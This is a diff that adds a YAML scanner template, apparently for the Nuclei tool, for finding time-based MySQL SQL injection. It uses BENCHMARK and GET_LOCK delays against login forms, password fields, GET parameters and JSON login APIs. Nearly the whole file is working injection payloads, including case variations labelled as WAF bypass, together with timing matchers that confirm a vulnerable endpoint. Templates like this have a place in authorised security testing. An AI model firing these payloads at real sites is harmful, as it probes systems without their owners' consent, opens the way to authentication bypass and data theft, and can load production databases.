@@ -1,0 +1,206 @@
+id: timebased-sqli-benchmark
+
+info:
+  name: Time-based SQL Injection (BENCHMARK Function)
+  author: custom
+  severity: critical
+  description: |
+    Detects Time-based SQL Injection using MySQL BENCHMARK function.
+    Useful when SLEEP function is filtered but BENCHMARK is allowed.
+    BENCHMARK(count, expr) executes the expression count times, causing measurable delay.
+  tags: sqli,time-based,benchmark,mysql,injection,custom
+  reference:
+    - https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_benchmark
+    - https://owasp.org/www-community/attacks/Blind_SQL_Injection
+
+variables:
+  # BENCHMARK iterations - higher = longer delay
+  iterations: "10000000"
+
+http:
+  # Vector 1: POST login form - username parameter (Primary)
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/signin"
+      - "{{BaseURL}}/auth"
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username={{payload}}&password=test"
+    payloads:
+      payload:
+        # Basic BENCHMARK injection (single quote)
+        - "' OR BENCHMARK({{iterations}},MD5(1))-- "
+        - "' OR BENCHMARK({{iterations}},SHA1(1))-- "
+
+        # IF-based BENCHMARK (always true condition)
+        - "' OR IF(1=1,BENCHMARK({{iterations}},MD5(1)),0)-- "
+        - "' OR IF(1=1,BENCHMARK({{iterations}},SHA1(1)),0)-- "
+        - "' OR IF(1,BENCHMARK({{iterations}},MD5(1)),0)-- "
+
+        # With # comment (MySQL specific)
+        - "' OR BENCHMARK({{iterations}},MD5(1))#"
+        - "' OR IF(1=1,BENCHMARK({{iterations}},MD5(1)),0)#"
+
+        # Case variations for WAF bypass
+        - "' OR BeNcHmArK({{iterations}},MD5(1))-- "
+        - "' OR BenChMarK({{iterations}},md5(1))-- "
+        - "' OR benchmark({{iterations}},md5(1))-- "
+
+        # With space variations
+        - "'OR BENCHMARK({{iterations}},MD5(1))-- "
+        - "' OR  BENCHMARK({{iterations}},MD5(1))-- "
+
+        # Numeric context
+        - "1' OR BENCHMARK({{iterations}},MD5(1))-- "
+        - "admin' OR BENCHMARK({{iterations}},MD5(1))-- "
+
+    attack: batteringram
+    stop-at-first-match: true
+    # Increase timeout to allow BENCHMARK to execute
+    max-redirects: 0
+
+    matchers:
+      - type: dsl
+        name: sqli-benchmark-username-delay
+        dsl:
+          - 'duration >= 2'
+          - 'status_code == 200 || status_code == 302 || status_code == 401 || status_code == 403'
+        condition: and
+
+    extractors:
+      - type: dsl
+        name: response-time-seconds
+        dsl:
+          - 'duration'
+
+  # Vector 2: POST login form - password parameter
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/signin"
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=admin&password={{payload}}"
+    payloads:
+      payload:
+        - "' OR BENCHMARK({{iterations}},MD5(1))-- "
+        - "' OR IF(1=1,BENCHMARK({{iterations}},MD5(1)),0)-- "
+        - "' OR BENCHMARK({{iterations}},MD5(1))#"
+        - "' OR IF(1,BENCHMARK({{iterations}},MD5(1)),0)-- "
+        - "admin' OR BENCHMARK({{iterations}},MD5(1))-- "
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        name: sqli-benchmark-password-delay
+        dsl:
+          - 'duration >= 2'
+          - 'status_code == 200 || status_code == 302 || status_code == 401 || status_code == 403'
+        condition: and
+
+  # Vector 3: Double quote injection
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username={{payload}}&password=test"
+    payloads:
+      payload:
+        - '" OR BENCHMARK({{iterations}},MD5(1))-- '
+        - '" OR IF(1=1,BENCHMARK({{iterations}},MD5(1)),0)-- '
+        - '" OR BENCHMARK({{iterations}},MD5(1))#'
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        name: sqli-benchmark-doublequote-delay
+        dsl:
+          - 'duration >= 2'
+          - 'status_code >= 200 && status_code < 500'
+        condition: and
+
+  # Vector 4: GET parameter injection
+  - method: GET
+    path:
+      - "{{BaseURL}}/login?{{param}}={{payload}}"
+      - "{{BaseURL}}/user?{{param}}={{payload}}"
+      - "{{BaseURL}}?{{param}}={{payload}}"
+    payloads:
+      param:
+        - "id"
+        - "user"
+        - "username"
+        - "uid"
+      payload:
+        - "1' OR BENCHMARK({{iterations}},MD5(1))-- "
+        - "1' OR IF(1=1,BENCHMARK({{iterations}},MD5(1)),0)-- "
+
+    attack: clusterbomb
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        name: sqli-benchmark-get-delay
+        dsl:
+          - 'duration >= 2'
+          - 'status_code == 200 || status_code == 302'
+        condition: and
+
+  # Vector 5: Alternative time functions (GET_LOCK)
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username={{payload}}&password=test"
+    payloads:
+      payload:
+        # GET_LOCK waits for specified seconds
+        - "' OR GET_LOCK('nuclei_sqli_test',3)-- "
+        - "' OR IF(1=1,GET_LOCK('test',3),0)-- "
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        name: sqli-getlock-delay
+        dsl:
+          - 'duration >= 2'
+          - 'status_code >= 200 && status_code < 500'
+        condition: and
+
+  # Vector 6: JSON API injection
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/api/auth"
+      - "{{BaseURL}}/login"
+    headers:
+      Content-Type: application/json
+    body: '{"username":"{{payload}}","password":"test"}'
+    payloads:
+      payload:
+        - "' OR BENCHMARK({{iterations}},MD5(1))-- "
+        - "' OR IF(1=1,BENCHMARK({{iterations}},MD5(1)),0)-- "
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        name: sqli-benchmark-json-delay
+        dsl:
+          - 'duration >= 2'
+          - 'status_code == 200 || status_code == 401 || status_code == 400'
+        condition: and
